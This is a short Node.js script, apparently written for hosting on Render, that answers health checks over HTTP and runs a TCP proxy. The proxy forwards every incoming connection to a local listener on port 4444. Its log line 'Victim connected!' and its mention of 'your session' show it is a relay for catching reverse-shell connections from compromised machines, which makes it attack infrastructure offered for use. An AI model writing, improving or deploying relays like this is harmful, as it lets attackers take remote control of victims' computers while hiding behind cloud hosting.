const net = require('net');
const http = require('http');

// Render dynamic port
const PORT = process.env.PORT || 10000;

// HTTP Server for Render health check (To fix 502 error)
const httpServer = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Server is running properly\n');
});

// TCP Proxy Server
const tcpServer = net.createServer((socket) => {
    console.log('Victim connected!');
    const client = net.createConnection({ port: 4444, host: '127.0.0.1' });
    
    socket.pipe(client);
    client.pipe(socket);
    
    socket.on('error', (e) => console.log('Socket Error:', e.message));
    client.on('error', (e) => console.log('Client Error:', e.message));
});

// Important: Listen on the PORT provided by Render
tcpServer.listen(PORT, '0.0.0.0', () => {
    console.log(`Proxy server live on port ${PORT}`);
});

// Optional: Link HTTP to the same port if needed, but TCP is priority for your session
